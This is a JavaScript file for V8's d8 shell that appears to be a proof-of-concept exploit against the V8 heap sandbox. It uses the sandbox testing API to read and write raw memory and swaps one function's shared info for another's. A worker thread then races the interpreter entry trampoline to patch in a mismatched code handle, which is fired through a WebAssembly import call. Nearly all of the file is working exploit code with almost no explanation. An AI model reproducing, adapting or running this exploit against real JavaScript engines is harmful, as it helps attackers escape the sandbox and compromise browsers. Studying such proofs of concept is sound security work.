const DRIVER_TIMEOUT_MS = 5000;
const DRIVER_ATTEMPTS = 3;

const driverScript = function() {
  onmessage = function({ data: doneBuffer }) {
    const driverDone = new Int32Array(doneBuffer);
    try {
// d8.file.execute('../../test/mjsunit/wasm/wasm-module-builder.js');

// let builder = new WasmModuleBuilder();

// let $im = builder.addImport('m', 'f', kSig_v_v);
// builder.addFunction('main', kSig_l_l)
//   .addBody([
//     kExprCallFunction, $im,
//     kExprLocalGet, 0,
//   ])
//   .exportFunc();

// let wasm_code = builder.toArray();
// console.log(wasm_code);
let wasm_code = [
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x09, 0x02, 0x60, 0x00, 0x00, 0x60, 0x01,
    0x7e, 0x01, 0x7e, 0x02, 0x07, 0x01, 0x01, 0x6d, 0x01, 0x66, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01,
    0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x10,
    0x00, 0x20, 0x00, 0x0b, 0x00, 0x0e, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x01, 0x07, 0x01, 0x01, 0x04,
    0x6d, 0x61, 0x69, 0x6e
  ];
  
  let module = new WebAssembly.Module(new Uint8Array(wasm_code));
  
  // worker
  const workerScript = function() {
    let buffer = new Sandbox.MemoryView(0, 0x100000000);
    let memory = new DataView(buffer);
  
    onmessage = function({ data: msg }) {
      const { func_victim_ptr, func_baseline_handle, buffer } = msg;
      const sync = new Int32Array(buffer);
  
    //   console.log(`worker: func_victim: 0x${func_victim_ptr.toString(16)}`);
    //   console.log(`worker: func_baseline_handle: 0x${func_baseline_handle.toString(16)}`);
  
      const shared = memory.getUint32(func_victim_ptr + 0xf, true);
      const shared_age_ptr = shared + 0x2b;
      const func_victim_handle_ptr = func_victim_ptr + 0xb;
  
      function race(sync, age_ptr, handle_ptr, handle, max_spins = 100000, signal = false) {
        if (signal) {
          Atomics.store(sync, 0, 1);
          Atomics.notify(sync, 0, 1);
        }
        for (let i = 0; i < max_spins; i++) {
          if (memory.getUint32(age_ptr, true) !== 0x1337) {
            if (signal) {
              for (let delay = 0; delay < 900; delay++);
            }
            memory.setUint32(handle_ptr, handle, true);
            return true;
          }
        }
        return false;
      }
  
      let array = new Array(0xfff0); // large object
      let array_ptr = Sandbox.getAddressOf(array);
      let elements_ptr = memory.getUint32(array_ptr + 0x8, true);
      let dummy_sync = new Int32Array(8);
      // opt race
      // %PrepareFunctionForOptimization(race);
      // race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1);
      // %OptimizeFunctionOnNextCall(race);
      // race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1);
      for (let i = 0; i < 20000; i++) {
        race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1, 1);
        race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1, 1);
      }
    //   console.log("worker: racing");
      race(sync, shared_age_ptr, func_victim_handle_ptr, func_baseline_handle, 100000, true);
      if (typeof close === 'function') close();
    //   console.log('worker: victim patched');
    }
  }
  
  const worker = new Worker(workerScript, { type: 'function' });
  
  const sync = new Int32Array(new SharedArrayBuffer(8));
  
  const kHeapObjectTag = 1;
  
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  
  function getPtr(obj) {
    return Sandbox.getAddressOf(obj) + kHeapObjectTag;
  }
  function getField(obj, offset) {
    return memory.getUint32(obj + offset - kHeapObjectTag, true);
  }
  function setField(obj, offset, value) {
    memory.setUint32(obj + offset - kHeapObjectTag, value, true);
  }
  
  function func_victim(a, b) {
    return a - b;
  }
  
  function func_baseline(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27, a28, a29, a30, a31, a32, a33, a34, a35, a36, a37, a38, a39, a40, a41, a42, a43, a44, a45) {
    a14 = a45;
  }
  
  function disable_opt(func) {
    let shared = getField(getPtr(func), 0x10);
    let flags = getField(shared, 0x20);
    flags |= 11 << 19;
    setField(shared, 0x20, flags);
  }
  
  // %CompileBaseline(func_baseline);
  disable_opt(func_baseline);
  (function() {
    for (let i = 0; i < 1e5; i++) {
      func_baseline();
    }
  })();
  
  func_victim(1, 2);
  
  gc({ type: 'major' });
  
  let func_victim_ptr = getPtr(func_victim);
  let func_baseline_ptr = getPtr(func_baseline);
  
  let func_baseline_handle = getField(func_baseline_ptr, 0xc);
  
  let func_baseline_shared = getField(func_baseline_ptr, 0x10);
  setField(func_victim_ptr, 0x10, func_baseline_shared);
  setField(func_baseline_shared, 0x2c, 0x1337); // shared_age, InterpreterEntryTrampoline will clear shared_age
  
//   console.log(`  main: func_victim: 0x${func_victim_ptr.toString(16)}`);
//   console.log(`  main: func_baseline_handle: 0x${func_baseline_handle.toString(16)}`);
//   console.log(`  main: func_baseline_shared: 0x${func_baseline_shared.toString(16)}`);
  
  
  function foo() {
    worker.postMessage({
      func_victim_ptr: func_victim_ptr,
      func_baseline_handle: func_baseline_handle,
      buffer: sync.buffer,
    });
  
    Atomics.wait(sync, 0, 0);
  
    // %DebugPrint(func_baseline);
    func_victim(1, 2);
  }
  
  let instance = new WebAssembly.Instance(module, { m: { f: foo } });
  instance.exports.main(0x414141414141n);
    } finally {
      Atomics.store(driverDone, 0, 1);
      Atomics.notify(driverDone, 0);
      if (typeof close === 'function') close();
    }
  };
};

for (let attempt = 0; attempt < DRIVER_ATTEMPTS; attempt++) {
  const driverDone = new Int32Array(new SharedArrayBuffer(4));
  const driver = new Worker(driverScript, { type: 'function' });
  driver.postMessage(driverDone.buffer);
  Atomics.wait(driverDone, 0, 0, DRIVER_TIMEOUT_MS);
  driver.terminate();
}

quit(0);

//   console.log('done');
